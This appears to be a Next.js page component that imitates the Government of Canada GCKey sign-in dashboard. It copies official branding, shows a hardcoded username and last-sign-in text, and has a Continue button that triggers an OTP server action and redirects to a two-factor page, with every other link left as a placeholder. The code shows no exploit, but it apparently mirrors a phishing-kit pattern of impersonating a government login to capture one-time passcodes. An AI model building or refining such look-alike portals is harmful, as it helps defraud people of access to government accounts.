"use client";

import { useRouter } from "next/navigation";
import { use, useTransition } from "react";
import { sendOtpAction } from "@/actions/authActions"; // adjust path

export default function DashboardPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  // Await the params
  const { id } = use(params);
  const router = useRouter();
  const [isPending, startTransition] = useTransition();

  const handleClick = async () => {
    startTransition(async () => {
      try {
        // call server action
        const res = await sendOtpAction(id);

        if (res.error) {
          alert(res.error.message?.[0] ?? "Failed to send OTP");
          return;
        }

        // ✅ redirect only after OTP is successfully sent
        router.push("/twofactor");
      } catch (err) {
        console.error(err);
        alert("Something went wrong.");
      }
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b w-full">
        <div className="w-full flex items-center justify-between px-8 py-5 max-w-none">
          {/* Left: Logo and Gov Text */}
          <div className="flex items-center space-x-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Canada_%28Pantone%29.svg"
              alt="Canadian Flag"
              className="w-20 h-20"
            />
            <div className="leading-tight">
              <p className="text-lg font-bold">Government</p>
              <p className="text-lg font-bold">of Canada</p>
            </div>
            <div className="ml-6 border-l h-8 border-gray-300"></div>
            <div className="leading-tight">
              <p className="text-lg font-bold">Gouvernement</p>
              <p className="text-lg font-bold">du Canada</p>
            </div>
          </div>

          {/* Language */}
          <a
            href="#"
            className="text-base text-blue-900 hover:underline font-medium"
          >
            Français
          </a>
        </div>

        {/* Navigation Bar */}
        <nav className="w-screen bg-[#2f4b72] text-white text-sm border-t border-b border-white/20">
          <div className="grid grid-cols-[40px_1fr_1fr_1fr_40px] w-screen">
            <div className="border-r border-white/20"></div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                Definitions
              </a>
            </div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                Frequently Asked Questions (FAQ)
              </a>
            </div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                Help
              </a>
            </div>
            <div></div>
          </div>
        </nav>
      </header>

      {/* Breadcrumb */}
      <div className="w-full max-w-[1400px] mx-auto px-8 pt-6 text-left">
        <p className="text-sm text-gray-700 mb-2">
          Home ➜ <span className="text-blue-800">Welcome Azeem.liaqat1999</span>
        </p>
      </div>

      {/* Main Content */}
      <main className="w-full max-w-[1400px] mx-auto px-8 py-10">
        <div className="flex flex-col md:flex-row gap-8">
          {/* Main Content Box */}
          <div className="flex-1 p-2 order-1 md:order-1">
            <h1 className="text-3xl font-bold text-gray-900 mb-4">
              Welcome Azeem.liaqat1999
            </h1>
            <p className="text-gray-800 mb-4">
              You last signed in with your GCKey on{" "}
              <strong>Thursday, August 28, 2025 at 15:21:28 ET.</strong>
            </p>

            <p className="text-gray-800 mb-6">
              From this page you can{" "}
              <a href="#" className="text-blue-800 hover:underline">
                Change Your Password
              </a>
              ,{" "}
              <a href="#" className="text-blue-800 hover:underline">
                Change Your Recovery Questions
              </a>
              ,{" "}
              <a href="#" className="text-blue-800 hover:underline">
                Manage Your Email Address
              </a>{" "}
              or{" "}
              <a href="#" className="text-blue-800 hover:underline">
                Revoke Your GCKey
              </a>
              .
            </p>

            <p className="text-gray-800 mb-4">
              To help protect your information, please remember to sign out and
              close your browser before leaving this computer unattended.
            </p>

            <p className="text-gray-800 mb-6">
              Please select <strong>Continue</strong> to proceed to two-factor
              authentication.
            </p>

            <div className="text-center md:text-left">
              <button
                onClick={handleClick}
                disabled={isPending}
                className="bg-[#2f4b72] text-white px-8 py-2 rounded hover:bg-[#1f3555] disabled:opacity-50"
              >
                {isPending ? "Sending OTP..." : "Continue"}
              </button>
            </div>
          </div>

          {/* Sidebar */}
          <aside className="w-full md:w-1/4 bg-white rounded-lg shadow-sm p-6 h-fit order-2 md:order-2">
            <h2 className="font-bold text-lg mb-4">Options</h2>
            <ul className="space-y-1">
              {[
                "Change Your Password",
                "Change Your Recovery Questions",
                "Manage Your Email Address",
                "Revoke Your GCKey",
                "Sign Out",
              ].map((item) => (
                <li key={item}>
                  <a
                    href="#"
                    className="block text-gray-600 px-3 py-2 rounded hover:bg-gray-100"
                  >
                    {item}
                  </a>
                </li>
              ))}
            </ul>
          </aside>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-16">
        <div className="bg-white px-8 py-4 text-sm text-gray-800 w-full">
          Date modified: <strong>2024-07-20</strong>
        </div>
        <div className="bg-[#e9ecef] w-full">
          <div className="w-full px-8 py-10 grid grid-cols-1 md:grid-cols-3 gap-12 text-sm text-gray-900">
            <div>
              <h4 className="font-bold text-lg mb-4">About</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    About GCKey
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Enabled Services
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Site Map
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-lg mb-4">Transparency</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Proactive Disclosure
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Terms and Conditions
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-lg mb-4">Contact Us</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Phone Numbers
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="h-[4px] bg-[#2f4b72] w-full"></div>
        </div>
        <div className="bg-white py-6 px-8 flex justify-end w-full">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Canada_wordmark.svg"
            alt="Canada wordmark"
            className="h-8"
          />
        </div>
      </footer>
    </div>
  );
}
